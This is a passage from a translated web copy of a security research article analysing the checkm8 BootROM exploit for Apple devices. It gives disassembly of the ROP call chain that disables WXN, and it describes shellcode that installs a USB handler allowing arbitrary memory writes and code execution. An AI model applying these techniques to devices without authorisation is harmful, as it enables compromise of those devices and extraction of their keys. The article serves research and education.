bootrom:000000010000CC68 MOV W0, #0 bootrom:000000010000CC6C bootrom:000000010000CC6C loc_10000CC6C ; CODE XREF: sub_10000CC1C+48‚Üëj bootrom:000000010000CC6C LDP X29, X30, [SP,#0x10+var_s0] bootrom:000000010000CC70 LDP X20, X19, [SP+0x10+var_10],#0x20 bootrom:000000010000CC74 RET</code> </pre> <br><p> As you can see, at the offset of <code>0x70</code> from the pointer to the structure, the call's address and its first argument are loaded. With this gadget, we can easily make any <code>f(x)</code> type calls for arbitrary <code>f</code> and <code>x</code> . </p><br><p> The entire call chain can be easily emulated with <code>Unicorn Engine</code> . We did it with our modified version of the plugin <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">uEmu</a> . </p><br><p><img src="https://habrastorage.org/webt/ri/b2/me/rib2mefgpchdxbiro3ukyyyjzt0.png"></p><br><p> The results of the entire chain for <code>iPhone 7</code> can be found below. </p><br><h4 id="51-dc_civac-0x1800b0600"> 5.1. <code>dc_civac 0x1800B0600</code> </h4><br><pre> <code class="plaintext hljs">000000010000046C: SYS #3, c7, c14, #1, X0 0000000100000470: RET</code> </pre> <br><p> Clearing and invalidating the processor's cache at a virtual address. This will make the processor address our payload later. </p><br><h4 id="52-dmb"> 5.2. <code>dmb</code> </h4><br><pre> <code class="plaintext hljs">0000000100000478: DMB SY 000000010000047C: RET</code> </pre> <br><p> A memory barrier that guarantees the completion of all operations with the memory done before this instruction. Instructions in high-performance processors can be executed in an order different from the programmed one for the purpose of optimization. </p><br><h4 id="53-enter_critical_section"> 5.3. <code>enter_critical_section()</code> </h4><br><p> Then, interrupts are masked for the atomic execution of further operations. </p><br><h4 id="54-write_ttbr00x1800b0000"> 5.4. <code>write_ttbr0(0x1800B0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p> A new value of the table register <code>TTBR0_EL1</code> is set in <code>0x1800B0000</code> . It is the address of <code>INSECURE MEMORY</code> where the exploit's payload is stored. As was mentioned before, the translation descriptors are located at certain offsets in the payload: </p><br><pre> <code class="plaintext hljs">... 0x1800B0400: 0x1000006a5 0x100000000 -&gt; 0x100000000 (rx) ... 0x1800B0600: 0x60000180000625 0x180000000 -&gt; 0x180000000 (rw) 0x1800B0608: 0x1800006a5 0x182000000 -&gt; 0x180000000 (rx) ...</code> </pre> <br><h4 id="55-tlbi"> 5.5. <code>tlbi</code> </h4><br><pre> <code class="plaintext hljs">0000000100000434: DSB SY 0000000100000438: SYS #0, c8, c7, #0 000000010000043C: DSB SY 0000000100000440: ISB 0000000100000444: RET</code> </pre> <br><p> The translation table is invalidated in order to translate addresses according to our new translation table. </p><br><h4 id="56-0x1820b0610---disable_wxn_arm64"> 5.6. <code>0x1820B0610 - disable_wxn_arm64</code> </h4><br><pre> <code class="plaintext hljs">MOV X1, #0x180000000 ADD X2, X1, #0xA0000 ADD X1, X1, #0x625 STR X1, [X2,#0x600] DMB SY MOV X0, #0x100D MSR SCTLR_EL1, X0 DSB SY ISB RET</code> </pre> <br><p> <code>WXN</code> (Write permission implies Execute-never) is disabled to allow us execute code in <code>RW</code> memory. The execution of the <code>WXN</code> disabling code is possible due to the modified translation table. </p><br><h4 id="57-write_ttbr00x1800a0000"> 5.7. <code>write_ttbr0(0x1800A0000)</code> </h4><br><pre> <code class="plaintext hljs">00000001000003E4: MSR #0, c2, c0, #0, X0; [&gt;] TTBR0_EL1 (Translation Table Base Register 0 (EL1)) 00000001000003E8: ISB 00000001000003EC: RET</code> </pre> <br><p> The original value of the <code>TTBR0_EL1</code> translation register is restored. It is necessary for the correct operation of <code>BootROM</code> during the translation of virtual addresses because the data in <code>INSECURE_MEMORY</code> will be overwritten. </p><br><h4 id="58-tlbi"> 5.8. <code>tlbi</code> </h4><br><p> The translation table is reset again. </p><br><h4 id="59-exit_critical_section"> 5.9. <code>exit_critical_section()</code> </h4><br><p> Interrupt handling is back to normal. </p><br><h4 id="510-0x1800b0000"> 5.10. <code>0x1800B0000</code> </h4><br><p> Control is transferred to the initializing <code>shellcode</code> . </p><br><p> Thus, the main task of <code>callback-chain</code> is to disable <code>WXN</code> and transfer control to the <code>shellcode</code> in <code>RW</code> memory. </p><br><h2 id="6-execution-of-shellcode"> 6. Execution of <code>shellcode</code> </h2><br><p> The <code>shellcode</code> is in <code>src/checkm8_arm64.S</code> and does the following: </p><br><h4 id="61-overwriting-usb-configuration-descriptors">  6.1. Overwriting <code>USB</code> configuration descriptors </h4><br><p> In the global memory, two pointers to configuration descriptors <code>usb_core_hs_configuration_descriptor</code> and <code>usb_core_fs_configuration_descriptor</code> located in the heap are stored. In the third stage, these descriptors were damaged. They are necessary for the correct interaction with a <code>USB</code> device, so the <code>shellcode</code> restores them. </p><br><h4 id="62-changing-usbserialnumber">  6.2. Changing <code>USBSerialNumber</code> </h4><br><p> A new string descriptor with a serial number is created with a substring <code>" PWND:[checkm8]"</code> added to it. This will help us understand if the exploit was successful. </p><br><h4 id="63-overwriting-the-pointer-of-the-usb-request-handler"> 6.3. Overwriting the pointer of the <code>USB</code> request handler </h4><br><p> The original pointer to the handler of <code>USB</code> requests to the interface is overwritten by a pointer to a new handler, which will be placed in the memory at the next step. </p><br><h4 id="64-copying-usb-request-handler-into-trampoline-memory-area-0x1800afc00"> 6.4. Copying <code>USB</code> request handler into <code>TRAMPOLINE</code> memory area ( <code>0x1800AFC00</code> ) </h4><br><p> Upon receiving a <code>USB</code> request, the new handler checks the <code>wValue</code> of the request against <code>0xffff</code> and if they're not equal, it transfers control back to the original handler. If they are equal, various commands can be executed in the new handlers, like <code>memcpy</code> , <code>memset</code> , and <code>exec</code> (calling an arbitrary address with an arbitrary set of arguments). </p><br><p> Thus, the analysis of the exploit is complete. </p><br><h2 id="the-implementation-of-the-exploit-at-a-lower-level-of-working-with-usb"> The implementation of the exploit at a lower level of working with USB </h2><br><p> As a bonus and an example of the attack at lower levels, we published a <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Proof-of-Concept</a> of the <code>checkm8</code> implementation on <code>Arduino</code> with <code>USB Host Shield</code> . The PoC works only for <code>iPhone 7</code> but can be easily ported to other devices. When an <code>iPhone 7</code> in <code>DFU</code> mode is connected to <code>USB Host Shield</code> , all the steps described in this article will be executed, and the device will enter <code>PWND:[checkm8]</code> mode. Then, it can be connected to a PC via <code>USB</code> to work with it using <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">ipwndfu</a> (to dump memory, use crypto keys, etc.). This method is more stable than using asynchronous requests with a minimal timeout because we work directly with the <code>USB</code> controller. We used the <a href="">USB_Host_Shield_2.0</a> library. It needs minor modifications; the patch file is also in the repository. </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/7o/bx/ni/7obxni6ihhdg8tz0dljedtfmrwy.jpeg"></div><br><h2 id="in-place-of-a-conclusion"> In place of a conclusion </h2><br><p> Analyzing <code>checkm8</code> was very interesting. We hope that this article will be useful for the community and will motivate new research in this area. The vulnerability will continue to influence the jailbreak community. A jailbreak based on <code>checkm8</code> is already being developed ‚Äî <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">checkra1n</a> , and since the vulnerability is unfixable, it will always work on vulnerable chips ( <code>A5</code> to <code>A11</code> ) regardless of the iOS version. Plus, there are many vulnerable devices, like <code>iWatch</code> , <code>Apple TV</code> , etc. We expect more interesting projects for Apple devices to come. </p><br><p> Besides jailbreak, this vulnerability will also influence the researchers of Apple devices. With <code>checkm8</code> , you can already boot <code>iOS</code> devices in verbose mode, dump <code>SecureROM</code> , or use the <code>GID</code> key to decrypt firmware images. Although, the most interesting application for this exploit would be entering debug mode on vulnerable devices with <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">a special JTAG/SWD cable</a> . Before that, it could only be done with special prototypes that are <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">extremely hard to get</a> or with the help of <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">special services</a> . Thus, with <code>checkm8</code> , <code>Apple</code> research becomes way easier and cheaper. </p><br><h2 id="references">  Referenzen </h2><br><ol><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Jonathan Levin, *OS Internals: iBoot</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Apple, iOS Security Guide</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">littlelailo, apollo.txt</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">usb.org</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">USB in a NutShell</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">ipwndfu</a> </li><li> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">an ipwndfu fork from LinusHenze</a> </li></ol></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de472762/">https://habr.com/ru/post/de472762/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de472750/index.html">OK, brauche ich wirklich Kubernetes?</a></li>
<li><a href="../de472752/index.html">CSE: Kubernetes f√ºr alle in vCloud</a></li>
<li><a href="../de472754/index.html">Wie man in einem Monat Englisch spricht. 9 einfache und bew√§hrte Schritte</a></li>
<li><a href="../de472758/index.html">Vorschlag: try - integrierte Fehlerpr√ºfungsfunktion</a></li>
<li><a href="../de472760/index.html">Reduzieren Sie die Rechenzeit von einigen Jahren auf Minuten. Quantenmaschinelles Lernen verstehen</a></li>
<li><a href="../de472766/index.html">Parametrierung aus Datei in py.test</a></li>
<li><a href="../de472768/index.html">So stellen Sie ein, entlassen und kehren vom Management zur Entwicklung zur√ºck: Video von Badoo Techleads Meetup # 5</a></li>
<li><a href="../de472770/index.html">Schnittstellenorganisation in Unity mit UI Canvas</a></li>
<li><a href="../de472772/index.html">Suchen Sie nach √§hnlichen Vorf√§llen und Anspr√ºchen. Metriken und Optimierung</a></li>
<li><a href="../de472776/index.html">Backup Teil 7: Schlussfolgerungen</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>